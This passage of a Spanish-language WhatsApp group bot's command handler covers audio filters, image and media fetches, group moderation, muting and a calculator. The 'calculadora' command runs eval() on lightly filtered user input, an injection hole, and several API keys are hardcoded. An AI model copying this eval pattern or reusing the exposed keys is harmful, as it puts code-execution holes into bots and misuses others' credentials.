muk = isQuotedAudio ? info.message.extendedTextMessage.contextInfo.quotedMessage.audioMessage : info.message.audioMessage
rane = getRandom('.'+await getExtension(muk.mimetype))
buffimg = await getFileBuffer(muk, 'audio')
fs.writeFileSync(rane, buffimg)
gem = rane
ran = getRandom('.mp3')
exec(`ffmpeg -i ${gem} -af equalizer=f=20:width_type=o:width=2:g=15 ${ran}`, (err, stderr, stdout) => {
fs.unlinkSync(gem)
if (err) return 
hah = fs.readFileSync(ran)
try {
sock.sendMessage(from, {audio: hah, mimetype: 'audio/mp4', ptt:true}, {quoted: info})
fs.unlinkSync(ran)
} catch (err) {
enviar(respuesta.error)
}
})
} else {
enviar("❌️]  𝐑𝐄𝐌𝐀𝐑𝐐𝐔𝐄 𝐔𝐍 𝐀𝐔𝐃𝐈𝐎 𝐏𝐎𝐑𝐅𝐀𝐕𝐎𝐑")
}
break
case 'estourar':
if ((isMedia && !info.message.imageMessage && !info.message.videoMessage || isQuotedAudio)) {
muk = isQuotedAudio ? info.message.extendedTextMessage.contextInfo.quotedMessage.audioMessage : info.message.audioMessage
rane = getRandom('.'+await getExtension(muk.mimetype))
buffimg = await getFileBuffer(muk, 'audio')
fs.writeFileSync(rane, buffimg)
gem = rane
ran = getRandom('.mp3')
exec(`ffmpeg -i ${gem} -af equalizer=f=90:width_type=o:width=2:g=30 ${ran}`, (err, stderr, stdout) => {
fs.unlinkSync(gem)
if (err) return 
hah = fs.readFileSync(ran)
try {
sock.sendMessage(from, {audio: hah, mimetype: 'audio/mp4', ptt:true}, {quoted: info})
fs.unlinkSync(ran)
} catch (err) {
enviar(respuesta.error)
}
})
} else {
enviar("❌️]  𝐑𝐄𝐌𝐀𝐑𝐐𝐔𝐄 𝐔𝐍 𝐀𝐔𝐃𝐈𝐎 𝐏𝐎𝐑𝐅𝐀𝐕𝐎𝐑")
}
break
case 'fast': case 'audiorapido':  
if ((isMedia && !info.message.imageMessage && !info.message.videoMessage || isQuotedAudio)) {
muk = isQuotedAudio ? info.message.extendedTextMessage.contextInfo.quotedMessage.audioMessage : info.message.audioMessage
rane = getRandom('.'+await getExtension(muk.mimetype))
buffimg = await getFileBuffer(muk, 'audio')
fs.writeFileSync(rane, buffimg)
gem = rane
ran = getRandom('.mp3')
exec(`ffmpeg -i ${gem} -filter:a "atempo=0.9,asetrate=95100" ${ran}`, (err, stderr, stdout) => {
fs.unlinkSync(gem)
if (err) return 
hah = fs.readFileSync(ran)
try {
sock.sendMessage(from, {audio: hah, mimetype: 'audio/mp4', ptt:true}, {quoted: info})
fs.unlinkSync(ran)
} catch (err) {
enviar(respuesta.error)
}
})
} else {
enviar("❌️]  𝐑𝐄𝐌𝐀𝐑𝐐𝐔𝐄 𝐔𝐍 𝐀𝐔𝐃𝐈𝐎 𝐏𝐎𝐑𝐅𝐀𝐕𝐎𝐑")
}
break

case 'esquilo':
if ((isMedia && !info.message.imageMessage && !info.message.videoMessage || isQuotedAudio)) {
muk = isQuotedAudio ? info.message.extendedTextMessage.contextInfo.quotedMessage.audioMessage : info.message.audioMessage
rane = getRandom('.'+await getExtension(muk.mimetype))
buffimg = await getFileBuffer(muk, 'audio')
fs.writeFileSync(rane, buffimg)
gem = rane
ran = getRandom('.mp3')
exec(`ffmpeg -i ${gem} -filter:a "atempo=0.7,asetrate=65100" ${ran}`, (err, stderr, stdout) => {
fs.unlinkSync(gem)
if (err) return 
hah = fs.readFileSync(ran)
try {
sock.sendMessage(from, {audio: hah, mimetype: 'audio/mp4', ptt:true}, {quoted: info})
fs.unlinkSync(ran)

} catch (err) {
enviar(respuesta.error)
}
})
} else {
enviar("❌️]  𝐑𝐄𝐌𝐀𝐑𝐐𝐔𝐄 𝐔𝐍 𝐀𝐔𝐃𝐈𝐎 𝐏𝐎𝐑𝐅𝐀𝐕𝐎𝐑")
}
break
case 'grave':
if ((isMedia && !info.message.imageMessage && !info.message.videoMessage || isQuotedAudio)) {
muk = isQuotedAudio ? info.message.extendedTextMessage.contextInfo.quotedMessage.audioMessage : info.message.audioMessage
rane = getRandom('.'+await getExtension(muk.mimetype))
buffimg = await getFileBuffer(muk, 'audio')
fs.writeFileSync(rane, buffimg)
gem = rane
ran = getRandom('.mp3')
exec(`ffmpeg -i ${gem} -filter:a "atempo=0.9,asetrate=44100" ${ran}`, (err, stderr, stdout) => {
fs.unlinkSync(gem)
if (err) return 
hah = fs.readFileSync(ran)
try {
sock.sendMessage(from, {audio: hah, mimetype: 'audio/mp4', ptt:true}, {quoted: info})
fs.unlinkSync(ran)
} catch (err) {
enviar(respuesta.error)
}
})
} else {
enviar("❌️]  𝐑𝐄𝐌𝐀𝐑𝐐𝐔𝐄 𝐔𝐍 𝐀𝐔𝐃𝐈𝐎 𝐏𝐎𝐑𝐅𝐀𝐕𝐎𝐑")
}
break
case 'git': case 'gitclone': case 'github':
if(!q) return enviar("[❗️] *Envie El Link de Github*")
if (!isUrl(args[0]) && !args[0].includes('github.com')) return enviar(`[❗️] *Link invalido* `)
let regex1 = /(?:https|git)(?::\/\/|@)github\.com[\/:]([^\/:]+)\/(.+)/i
    let [, user, repo] = args[0].match(regex1) || []
    repo = repo.replace(/.git$/, '')
    let url = `https://api.github.com/repos/${user}/${repo}/zipball`
    let filename = (await fetch(url, {method: 'HEAD'})).headers.get('content-disposition').match(/attachment; filename=(.*)/)[1]
    sock.sendMessage(from, { document: { url: url }, fileName: filename+'.zip', mimetype: 'application/zip' }, { quoted: info}).catch((err) => enviar(repuesta.error))
break
case 'tinyurl':{
   if(!q) return enviar(respuesta.textito)
   request(`https://tinyurl.com/api-create.php?url=${q}`, function (error, response, body) {
   try {
  enviar(body)
  } catch (e) {
  enviar(e)
  }
  })
  }
 break
case 'meow': case 'lizard': case 'avatar': case 'feed': case 'goose': case '8ball': case 'woof': case 'gecg': case 'tickle': case 'fox_girl': case 'nom': case 'waifu': case 'cuddle': case 'slap': case 'pat': case 'kiss': case 'hug': {
if(q) return enviar("[❗️] *No escriba ningun Texto Porfavor*")
    if (!isGroup) return enviar(respuesta.grupos)
 waifudd = await axios.get(`https://nekos.life/api/v2/img/${comando}`)     
            await sock.sendMessage(from, {image: {url:waifudd.data.url}, caption: respuesta.pedido},{ quoted:info }).catch(err => {
                    return('Error!')
                })
                }
break
case 'cry': case 'kill': case 'lick': case 'bite': case 'yeet': case 'bully': case 'bonk': case 'wink': case 'poke': case 'smile': case 'wave': case 'blush': case 'smug': case 'glomp': case 'happy': case 'dance': case 'cringe': case 'highfive': case 'handhold': case 'shinobu': case 'megumin': case 'awoo': {
 waifudd = await axios.get(`https://waifu.pics/api/sfw/${comando}`)       
            await sock.sendMessage(from, { image: { url:waifudd.data.url} , caption: respuesta.pedido}, { quoted: info }).catch(err => {
                    return('Error!')
                })
                }
break
          case 'emojimix': {
		let [emoji1, emoji2] = q.split`+`
		if (!emoji1) return enviar(`*Ejemplo* : ${comando} 😅+🤔`)
		if (!emoji2) return enviar(`*Ejemplo* : ${comando} 😅+🤔`)
		let anumojimix = await fetchJson(`https://tenor.googleapis.com/v2/featured?key=AIzaSyAyimkuYQYF_FXVALexPuGQctUWRURdCYQ&contentfilter=high&media_filter=png_transparent&component=proactive&collection=emoji_kitchen_v5&q=${encodeURIComponent(emoji1)}_${encodeURIComponent(emoji2)}`)
		for (let res of anumojimix.results) {
await enviarfiguimg(from, res.url, info, {
 packname: `${pushname}`, author: `${author}`
})				    
		}
	    }
	    break
          case 'userjid':{
           if (!isGroupAdmins) return enviar(respuesta.admin)
        if (!isBotGroupAdmins) return enviar(respuesta.botadmin)
        const groupMetadata = isGroup ? await sock.groupMetadata(from).catch((e) => {}) : ""
		const participants = isGroup ? await groupMetadata.participants : ""
    let textt = `_Aquí está la dirección jid de todos los usuarios del grupo_\n *- ${groupMetadata.subject}*\n`
    for (let mem of participants) {
            textt += `${mem.id}\n`
        }
      enviar(textt)
    }
    break
    case 'tag': case 'hidetag':
    if(!q) return enviar("digite un texto porfavor")
sock.sendMessage(from, { text: q, mentions: groupMembers.map(a => a.id) }, { quoted: info })
                break
                
case 'tagall': case 'tagal': case 'marcar': {
           if (!isGroupAdmins) return enviar(respuesta.admin)
        if (!isBotGroupAdmins) return enviar(respuesta.botadmin)
if(!q) return enviar(respuesta.textito)
me = sender
let teks = `
[❗️] 𝐀𝐍𝐔𝐍𝐂𝐈𝐎 : ${q}\n`
for (let mem of groupMembers) {
teks += `[ 📌]@${mem.id.split('@')[0]}\n`
}
teks2 = `${teks}
🍒 𝙰𝙲𝙲𝙸𝙾𝙽 𝚁𝙴𝙰𝙻𝙸𝚉𝙰𝙳𝙰 𝙿𝙾𝚁 :
 @${me.split('@')[0]}`
sock.sendMessage(from, { text: teks2, mentions: groupMembers.map(a => a.id) }, { quoted: info })
}
break
case 'closetime': case 'cerrargp':{
           if (!isGroupAdmins) return enviar(respuesta.admin)
        if (!isBotGroupAdmins) return enviar(respuesta.botadmin)
if ((args[1] == 'second') || (args[1] == 'segundos') || (args[1] == 'segundo')) {
var timer = args[0] * `1000`
} else if ((args[1] == 'minute') || (args[1] == 'minuto') || (args[1] == 'minutos')){
var timer = args[0] * `60000`
} else if ((args[1] == 'hour') || (args[1] == 'hora') || (args[1] == 'horas')) {
var timer = args[0] * `3600000`
} else if ((args[1] == 'day')|| (args[1] == 'dia') || (args[1] == 'dias')) {
var timer = args[0] * `86400000`
} else {
return enviar(`*Digite:*\nsecond\nminute\nhour\nday\n*Ejemplo*\n${comando}10 second`)
}
enviar(`*Hora de cierre : ${q} Apartir de ahora*`)
setTimeout(() => {
var nomor = groupMembers
var me = sender
const close = `*[❗️]Ufff el Grupo ${groupName} fue Cerrado Por el Administrador : @${me.split('@')[0]}*\n*Ahora Solo Los Administradores Pueden Enviar Mensajes*`
sock.groupSettingUpdate(from, 'announcement')
sock.sendMessage(from, { text: close, mentions: groupMembers.map(a => a.id) }, { quoted: info })
}, timer)
}
break
case 'opentime': case 'abrirgp': {
           if (!isGroupAdmins) return enviar(respuesta.admin)
        if (!isBotGroupAdmins) return enviar(respuesta.botadmin)
if ((args[1] == 'second') || (args[1] == 'segundos') || (args[1] == 'segundo')) {
var timer = args[0] * `1000`
} else if ((args[1] == 'minute') || (args[1] == 'minuto') || (args[1] == 'minutos')){
var timer = args[0] * `60000`
} else if ((args[1] == 'hour') || (args[1] == 'hora') || (args[1] == 'horas')) {
var timer = args[0] * `3600000`
} else if ((args[1] == 'day')|| (args[1] == 'dia') || (args[1] == 'dias')) {
var timer = args[0] * `86400000`
} else {
return enviar(`*Digite:*\nsecond\nminute\nhour\nday\n*Ejemplo*\n${comando}10 second`)
}
enviar(`*El grupo se abrirá a los : ${q} apartir de ahora*`)
setTimeout(() => {
var me = sender
var nomor = groupMembers
const open = `*[❗️] Uff , Él Grupo fue Abierto Por el Administrador : @${me.split('@')[0]}*\n*Ahora todos los miembros del grupo pueden enviar mensajes*`
sock.groupSettingUpdate(from, 'not_announcement')
sock.sendMessage(from, { text: open, mentions: groupMembers.map(a => a.id) }, { quoted: info })
}, timer)
}
break
case 'infogp': case 'infogrupo': case 'gpdescripcion':
           if (!isGroupAdmins) return enviar(respuesta.admin)
        if (!isBotGroupAdmins) return enviar(respuesta.botadmin)
try {
enviar(`${groupDesc}`)
} catch {
enviar(respuesta.error)
}
break
case 'linkgp': case 'linkgrupo': case 'linkgroup': case 'linkgc': case 'gclink': case 'grouplink': {
           if (!isGroupAdmins) return enviar(respuesta.admin)
        if (!isBotGroupAdmins) return enviar(respuesta.botadmin)
                let response = await sock.groupInviteCode(from)
                sock.sendText(from, `https://chat.whatsapp.com/${response}\n*Link Del Grupo : ${groupMetadata.subject}*`, info, { detectLink: true })
            }
            break
case 'ghstalk': case 'githubstalk':
if(!q) return (`*[❗️] Ejemplo : githubstalk venom*`)
aj = await githubstalk(`${q}`)
try{
sock.sendMessage(from, { image: { url : aj.profile_pic }, caption: 
`*/ Github Stalker \\*

Username : ${aj.username}
Nickname : ${aj.nickname}
Bio : ${aj.bio}
Id : ${aj.id}
Nodeid : ${aj.nodeId}
Url Profile : ${aj.profile_pic}
Url Github : ${aj.url}
Type : ${aj.type}
Admin : ${aj.admin}
Company : ${aj.company}
Blog : ${aj.blog}
Location : ${aj.location}
Email : ${aj.email}
Public Repo : ${aj.public_repo}
Public Gists : ${aj.public_gists}
Followers : ${aj.followers}
Following : ${aj.following}
Created At : ${aj.ceated_at}
Updated At : ${aj.updated_at}` }, { quoted: info} )
} catch {
enviar(respuesta.error)
}
break
case 'npmstalk':{
if (!q) return enviar(`*[❗️] Ejemplo : ${comando} axios*`)
eha = await npmstalk(q)
enviar(`*/ Npm Stalker \\*

Name : ${eha.name}
Version Latest : ${eha.versionLatest}
Version Publish : ${eha.versionPublish}
Version Update : ${eha.versionUpdate}
Latest Dependencies : ${eha.latestDependencies}
Publish Dependencies : ${eha.publishDependencies}
Publish Time : ${eha.publishTime}
Latest Publish Time : ${eha.latestPublishTime}`)
}
break
case 'meme': 
  if(!isQuotedImage) return enviar('[❗️] *Remarque una imagen Porfavor*')
  enviar("[⏳️] Creando Meme ..")
  try{
   var atas = q.split('|')[0] ? q.split('|')[0] : 'juls'
   var bawah = q.split('|')[1] ? q.split('|')[1] : 'domina'
  var encmediass = isQuotedImage ? info.message.extendedTextMessage.contextInfo.quotedMessage.imageMessage: info.message.imageMessage
var raneee = ('./tmp/Db_Juls.'+ await getExtension(encmediass.mimetype))
var imgbuffee = await getFileBuffer(encmediass, 'image')
fs.writeFileSync(raneee, imgbuffee)
var mediass = raneee
var rannn = getRandom('.'+mediass.split('.')[1])
var uploadd44 = await TelegraPh(mediass)
  var too = await getBuffer(`https://api.memegen.link/images/custom/${encodeURIComponent(atas)}/${encodeURIComponent(bawah)}.png?background=${uploadd44}`) 
  enviarfoto(too,respuesta.pedido)
  } catch {
  enviar(respuesta.error)
  }
break
case 'reviver': case 'add': case 'edotensei': case 'edo':
           if (!isGroupAdmins) return enviar(respuesta.admin)
        if (!isBotGroupAdmins) return enviar(respuesta.botadmin)
if(!q && info.message.extendedTextMessage === null) return enviar(`*[❗️] Remarque el Mensaje de la persona que desea ingresar o coloque ${comando}@persona `)       
let linkh = 'https://chat.whatsapp.com/' + await sock.groupInviteCode(from)    
try {
useradd = `${args.join(" ").replace(/\D/g,'')}` ? `${args.join(" ").replace(/\D/g,'')}` : info.message.extendedTextMessage.contextInfo.participant
let id = `${useradd.replace(/\D/g,'')}`
if(!id) return enviar(`*[❗️]Número inválido*`)
let [result] = await sock.onWhatsApp(id)
if(!result) return enviar(`[❗️] *Ese número no está registrado en WhatsApp*`)
let response = await sock.groupParticipantsUpdate(from, [result.jid], "add")
if(response[0].status == "409") {
sock.sendMessage(from, {text: `*[❗️] Él no se encuentra en el grupo, como lo voy a ingresar*`, mentions: [result.jid, sender]})
} else if(response[0].status == "403") {
sock.sendMessage(from, {text: `*No logre ingresar a @${result.jid.split("@")[0]} Porque su cuenta es privada, le enviaré la solicitud por chat privado*\n𝙰𝙲𝙲𝙸𝙾𝙽 𝚁𝙴𝙰𝙻𝙸𝚉𝙰𝙳𝙰 𝙿𝙾𝚁: @${sender.split('@')[0]}`, mentions: [result.jid, sender]})
setTimeout(async () => {
sock.sendMessage(`${result.jid.split("@")[0]}@s.whatsapp.net`,{ text :  `*[❗️] Alguien del Grupo ${groupName} te mando solicitud  y como tienes antigrupos , te envio el link aqui : \n${linkh}\n🍒 𝙰𝙲𝙲𝙸𝙾𝙽 𝚁𝙴𝙰𝙻𝙸𝚉𝙰𝙳𝙰 𝙿𝙾𝚁: @${sender.split('@')[0]}` , mentions: [result.jid, sender]})
 }, 100)
} else if(response[0].status == "408") {
sock.sendMessage(from, {text: `*No logré ingresar a @${result.jid.split("@")[0]} porqué ha salido recientemente*.`, mentions: [result.jid, sender]})
} else if(response[0].status == "401") {
sock.sendMessage(from, {text: `*No logré ingresar a @${result.jid.split("@")[0]} porque me bloquio el csmre*`, mentions: [result.jid, sender]})
} else if(response[0].status == "200") {
sock.sendMessage(from, {text: `*[❗️]Genial , nuestro querido usuario @${result.jid.split("@")[0]} fue ingresado al grupo*.\n🍒 𝙰𝙲𝙲𝙸𝙾𝙽 𝚁𝙴𝙰𝙻𝙸𝚉𝙰𝙳𝙰 𝙿𝙾𝚁 :
 @${sender.split('@')[0]}`, mentions: [result.jid, sender]})
} else {
enviar(respuesta.error)
}
} catch {
}
break
case 'emojimix2': {
	    if (!q)  enviar( `*Ejemplo : ${comando} 😅*`)
	    enviar(respuesta.espere)
		let anu = await fetchJson(`https://tenor.googleapis.com/v2/featured?key=AIzaSyAyimkuYQYF_FXVALexPuGQctUWRURdCYQ&contentfilter=high&media_filter=png_transparent&component=proactive&collection=emoji_kitchen_v5&q=${encodeURIComponent(q)}`)
		for (let res of anu.results) {
		await enviarfiguvid(from, res.url, info, {
 packname: `${pushname}`, author: `${author}`
}) 
		}
	    }
	    break
 case 'clima':case 'tempo': case 'tiempo':
if(!q) return enviar("[❗️] *Digite una ciudad*")
            cidade = body.slice(7)
            clima = await axios.get(`https://api.openweathermap.org/data/2.5/weather?q=${q}&appid=f5c0840c2457fbb64188a6d4be05618f&units=metric&lang=pt_br`)
            if (clima.error) return enviar(respuesta.error)
            jr = `🌞 Temperatura ahora: ${clima.data.main.temp}ºC
  🏙️ Ciudad: ${clima.data.name}
  🔥 Temperatura Máxima: ${clima.data.main.temp_max}°C
  ❄ Temperatura Mínima: ${clima.data.main.temp_min}°C
  🌦 Clima: ${clima.data.weather[0].description}
  💧 Unidad de ar: ${clima.data.main.humidity}% 
  🌫 Vientos: ${clima.data.wind.speed}  
  
  Solicitado por: ${pushname}`
  try{
            await sock.sendMessage(from, { text: jr }, { quoted: info, contextInfo: { "mentionedJid": jr } })
            } catch {
            enviar(respuesta.error)
            }
            break
case 'pinterest': 
if(!q) return enviar(respuesta.textito)
enviar(respuesta.espere)
try {
var loju = await getBuffer(`https://minijulscitoapi.store/api2/pinterest?texto=${encodeURIComponent(q)}&apikey=Vipppp`)
enviarfoto(loju,respuesta.pedido)
} catch {
enviar(respuesta.error)
}
break
case 'wallpaper':
if(!q) return enviar(respuesta.textito)
enviar(respuesta.espere)
try {
var loju = await fetchJson(`https://minijulscitoapi.store/api2/wallpaper?texto=${encodeURIComponent(q)}&apikey=Vipppp`)
sock.sendMessage(from,{ image : { url : loju.link }, caption : respuesta.pedido}, { quoted : info})
} catch {
enviar(respuesta.error)
}
break
case 'metadinha': 
                anu = await fetchJson('https://raw.githubusercontent.com/iamriz7/kopel_/main/kopel.json')
                random = anu[Math.floor(Math.random() * anu.length)]
                enviar(respuesta.espere)
                try{                
setTimeout(async function () {
sock.sendMessage(from,{ image : {url:random.male},caption : "[❗️] *Wallpaper Para varón*"},{ quoted : info})
       }, 1000)
       sock.sendMessage(from,{ image : {url:random.female},caption : "[❗️] *Wallpaper Para chica*"},{ quoted : info})   
       } catch {
       enviar(respuesta.error)
       }
	    break
case 'getcase' : case 'gcase' : case 'gc' :
if(!isOwner) return 
//enviar("*[❗️]La case será enviada a mi creador por su chat privado para evitar posibles robos o filtración de métodos Privados*")
try {
const getCase = (cases) => {
return 'case '+`'${cases}'`+fs.readFileSync("./index.js").toString().split('case \''+cases+'\'')[1].split("break")[0]+"break"
}
await sleep(500)
sock.sendMessage(from, {text: `${getCase(q.toLowerCase())}`},{quoted : info })
} catch(e) {
console.log(e)
await sleep(500)
enviar('[ ❗ ] 𝐂𝐎𝐌𝐀𝐍𝐃𝐎 𝐍𝐎 𝐄𝐍𝐂𝐎𝐍𝐓𝐑𝐀𝐃𝐎 ')
}
break
case 'mute': case 'mutear':
           if (!isGroupAdmins) return enviar(respuesta.admin)
        if (!isBotGroupAdmins) return enviar(respuesta.botadmin)
if(!q) return enviar("[❌️] *Uselo así : mute @persona*")                    
                    mentioned = info.message.extendedTextMessage.contextInfo.mentionedJid
                    if(isMuted) {
                        var ind = GroupsMutedActived.indexOf(from)
                        teks = '[🔇]  MUTADO [🔇]\n'
                        for (let _ of mentioned) {
                            teks += `┠➥ *[🗣️] Hola:* @${_.split('@')[0]}\n`
                            muted[ind].numbers.push(_)
                        }
                        fs.writeFileSync('./archivos/juegos/muted.json', JSON.stringify(muted, null, 2) + '\n')
                        teks += `\n┠➥ *[🙊]:* Fuiste muteado por el Admin: ${pushname}\nSi escribes algun mensaje seras eliminado automaticamente por el bot😡`
                        mentions(teks, mentioned, true)
                    } else {
                        const data = {
                            jid: from,
                            numbers: mentioned
                        }
                        muted.push(data)
                        fs.writeFileSync('./archivos/juegos/muted.json', JSON.stringify(muted, null, 2) + '\n')
                        teks = '[🔇]  MUTADO [🔇]\n'
                        for (let _ of mentioned) {
                            teks += `┠➥ *[🗣️] Hola:* @${_.split('@')[0]}\n`
                        }
                        teks += `\n┠➥ *[🙊]:* Fuiste muteado por el Administrador: ${pushname}\nSi escribes algun mensaje seras eliminado automaticamente por el bot 😡`
                        mentions(teks, mentioned, true)
                    }
                    break
case 'desmute': case 'desmutear':
            if (!isGroupAdmins) return enviar(respuesta.admin)
        if (!isBotGroupAdmins) return enviar(respuesta.botadmin)
if(!q) return enviar("[❌️] *Uselo así : desmute @persona*")                                       
                    mentioned = info.message.extendedTextMessage.contextInfo.mentionedJid
                    var ind = GroupsMutedActived.indexOf(from)
                    if(isMuted) {
                        for(let _ of mentioned) {
                            if(muted[ind].numbers.indexOf(_) >= 0) {
                                var rmind = muted[ind].numbers.indexOf(_)
                                muted[ind].numbers.splice(rmind, 1)
                            }
                        }
                        fs.writeFileSync('./archivos/juegos/muted.json', JSON.stringify(muted, null, 2) + '\n')
                        teks = '*[🗣️] DESMUTADO [🗣️]*\n'
                        for (let _ of mentioned) {
                            teks += `┠➥ *[🗣️] Hola:* @${_.split('@')[0]}\n`
                        }
                        teks += `[⛔️] El administrador: ${pushname}, Lo ha desmutado\n[🤝🏻] Hable con libertad, ya no será baneado.`
                        mentions(teks, mentioned, true)
                    } else {
                        const data = {
                            jid: from,
                            numbers: []
                        }
                        muted.push(data)
                        fs.writeFileSync('./archivos/juegos/muted.json', JSON.stringify(muted, null, 2) + '\n')
                        teks = '*[🗣️] DESMUTADO [🗣️]*\n'
                        for (let _ of mentioned) {
                            teks += `┠➥ *[🗣️] Olá:* @${_.split('@')[0]}\n`
                        }
                        teks += `[⛔️] El administrador: ${pushname}, Lo ha desmutado\n[🤝🏻] Hable con libertad, ya no será baneado.`
                        mentions(teks, mentioned, true)
                    }
                    break
case 'mutados': case 'muteados':
                    var ind = GroupsMutedActived.indexOf(from)
                    teks = '*[🔇]  MUTADO [??]*\n'
                    for (let _ of muted[ind].numbers) {
                        teks += `┠➥ *[🙊]:* @${_.split('@')[0]}\n`
                    }
                    teks += '\n┠➥ *[⚠️]* Lista Oficial de Mutados.\n[🫏] Si envian mensajes seran baneados'
                    enviar(teks)
                    break
case 'traducir':
if(!isGroup) return enviar(respuesta.grupos)
if (args.length < 1) return enviar(respuesta.textito)
enviar(respuesta.espere)
var textitox = args.join(' ')
var resultai = await translate(`${textitox}`, { to: "es", autoCorrect: true })
try{
enviar('[📚] *Traducción:*\n' + resultai.text)
}catch (e) {
enviar(respuesta.error)
}
break
case 'calculadora': case 'calcular':  case 'hgd':
if(!q) return enviar("[❌️] Porfavor Coloque algo a calcular con los signos + , - , *, /")
rsp = q.replace("x", "*").replace('"', ":").replace(new RegExp("[()abcdefghijklmnopqrstwuvxyz]", "gi"), "").replace("÷", "/")
return sock.sendMessage(from, { text : JSON.stringify(eval(`${rsp}`,null,'\t'))},{ quoted : info})
break 
case "top": case "tops":
if(!isGroup) return enviar(respuesta.grupos)
if(!q) return enviar(respuesta.textito)
var juk = ["🥰","🤢","🥶","😎","🥺","💩","💀","👿","👾","🤡","👻","🙈","💣","🐧","🐦","🐻","🐀","🐣","🦜","🌹","🌍","🔫","📚","🎩","📱"]
var emoxs = juk[Math.floor(Math.random()*juk.length)]
let ps = groupMembers.map(v => v.id)
let a = ps[Math.floor(Math.random()*ps.length)]
let b = ps[Math.floor(Math.random()*ps.length)]
let c = ps[Math.floor(Math.random()*ps.length)]
let d = ps[Math.floor(Math.random()*ps.length)]
let e = ps[Math.floor(Math.random()*ps.length)]
let f = ps[Math.floor(Math.random()*ps.length)]
let g = ps[Math.floor(Math.random()*ps.length)]
let h = ps[Math.floor(Math.random()*ps.length)]
let i = ps[Math.floor(Math.random()*ps.length)]
let j = ps[Math.floor(Math.random()*ps.length)]
if(q == q) {
const otakuslista = `
╔══════════════ ⍨
║ ➤ *Lista de ${q}*
╚╦═════════════ ⍨
╭╜ 
│ ➤ [${emoxs}] @${a.split('@')[0]}
│ ➤ [${emoxs}] @${b.split('@')[0]}
│ ➤ [${emoxs}] @${c.split('@')[0]}
│ ➤ [${emoxs}] @${d.split('@')[0]}
│ ➤ [${emoxs}] @${e.split('@')[0]}
│ ➤ [${emoxs}] @${f.split('@')[0]}
│ ➤ [${emoxs}] @${g.split('@')[0]}
│ ➤ [${emoxs}] @${h.split('@')[0]}
│ ➤ [${emoxs}] @${i.split('@')[0]}
│ ➤ [${emoxs}] @${j.split('@')[0]}
╚╦═════════════ ⍨
╭╜ 
`
sock.sendMessage(from,
 { text: otakuslista,contextInfo:{
mentionedJid:[ps,a,b,c,d,e,f,g,h,i,j],
}}, { quoted : info})
} else {
enviar("[⛔️] *Digite top burros, inteligentes,guapos,feos,parejas,geys,fieles o otakus")
}
break
case 'tomp3':
if(!isGroup) return enviar(respuesta.grupos)
if (!isQuotedVideo) return enviar("[❌️] 𝐑𝐄𝐌𝐀𝐑𝐂𝐀 𝐔𝐍 𝐕𝐈𝐃𝐄𝐎 𝐐𝐔𝐄 𝐓𝐄𝐍𝐆𝐀 𝐀𝐔𝐃𝐈𝐎") 
enviar(respuesta.espere)
buff = await getFileBuffer(info.message.extendedTextMessage.contextInfo.quotedMessage.videoMessage, "video")
try {
sock.sendMessage(from, {audio: buff,mimetype: 'audio/mpeg'}, {quoted: info})
      
} catch(e) {
console.log(e)
enviar(respuesta.error)
}
break
case 'tomp4':
if(!isGroup) return enviar(respuesta.grupos)
if (!isQuotedAudio) return enviar("[❌️] 𝐑𝐄𝐌𝐀𝐑𝐂𝐀 𝐔𝐍 𝐀𝐔𝐃𝐈𝐎 𝐂𝐎𝐍 𝐕𝐈𝐃𝐄𝐎")  
enviar(respuesta.espere)
buff = await getFileBuffer(info.message.extendedTextMessage.contextInfo.quotedMessage.audioMessage, "audio")
try {
sock.sendMessage(from, {video: buff,caption : respuesta.pedido,mimetype: 'video/mp4'}, {quoted: info})     
} catch(e) {
console.log(e)
enviar(respuesta.error)
}
break

case 'wallpaper2': case 'wikimedia':
if(!q) return enviar(respuesta.textito)
enviar(respuesta.espere)
var kuñ = await getBuffer(`https://minijulscitoapi.store/api2/${comando}?texto=${encodeURIComponent(q)}&apikey=Vipppp`)
try{
enviarfoto(kuñ, respuesta.espere)
} catch {
enviar(respuesta.espere)
}
break
case 'ringtone': case 'rin': case "rinn":
if(!q) return enviar(respuesta.textito)
enviar(respuesta.espere)
var juj = await fetchJson(`https://minijulscitoapi.store/api2/ringtone?texto=${encodeURIComponent(q)}&apikey=Vipppp`)
try{
sock.sendMessage(from,{ audio : { url : juj.ringtone},                     mimetype: 'audio/mp4',
                     ptt: true},{quoted : info})
} catch {
enviar(respuesta.error)
}
break
case 'frases1': case 'frases2': 
var juj = await fetchJson(`https://minijulscitoapi.store/api2/${comando}?&apikey=Vipppp`)
var resultai = await translate(`${juj[0]}`, { to: "es", autoCorrect: true })
try{
sock.sendMessage(from,{ text : resultai.text },{quoted : info})
} catch {
enviar(respuesta.error)
}
break
case 'wikipedia':
if(!q) return enviar(respuesta.textito)
enviar(respuesta.espere)
var loku = await fetchJson(`https://minijulscitoapi.store/api2/wikipedia?texto=${encodeURIComponent(q)}&apikey=Vipppp`)
var resultai = await translate(`${loku[0].wiki}`, { to: "es", autoCorrect: true })
try{
sock.sendMessage(from,{ image : { url : loku[0].thumb}, caption : resultai.text }, { quoted : info})
} catch {
enviar(respuesta.error)
}
break
case 'lirik': case 'letramusic':
if(!q) return enviar(respuesta.textito);
enviar(respuesta.espere)
var juk = await fetchJson(`https://minijulscitoapi.store/api2/lirik?texto=${encodeURIComponent(q)}&apikey=Vipppp`)
try{
sock.sendMessage(from,{ text : juk[0].lirik},{ quoted :  info})
} catch {
enviar(respuesta.error)
}
break
case 'facebook': case 'fb': 
if(!q) return enviar(respuesta.linkii)
enviar(respuesta.espere)
var lu = await fetchJson(`https://minijulscitoapi.store/download/facebook?url=${encodeURIComponent(q)}&apikey=Vipppp`)
try{
sock.sendMessage(from,{ video : { url : lu.videoUrl}, caption : respuesta.pedido},{ quoted : info})
} catch {
enviar(respuesta.error)
}
break
case 'duelos':  case 'duelo': case 'versus':
if (args.length === 0) return enviar(`𝚄𝚂𝙴𝙻𝙾 𝙳𝙴 𝙻𝙰 𝚂𝙸𝙶𝚄𝙸𝙴𝙽𝚃𝙴 𝙼𝙰𝙽𝙴𝚁𝙰 :\nduelo texto / @persona / @persona2 / tiempo (1 = 1 Minuto)\n𝙴𝙹𝙴𝙼𝙿𝙻𝙾 : ${comando} @persona / @persona2 / 1`)
txt = args.join(' ')
texto1 = txt.split('/')[0] || 'Indefinido'
nmr = txt.split('/')[1].replace('@' ,  '').replace(' ', '').replace(' ', '').replace(' ', '')
nmr2 = txt.split('/')[2].replace('@' ,  '').replace(' ', '').replace(' ', '').replace(' ', '')
pergunta = texto1
tempo = txt.split('/')[3]
if(!Number(tempo)) return enviar('Falta Ingresar Los Minutos Para el Duelo\n1 = 1 Minuto')
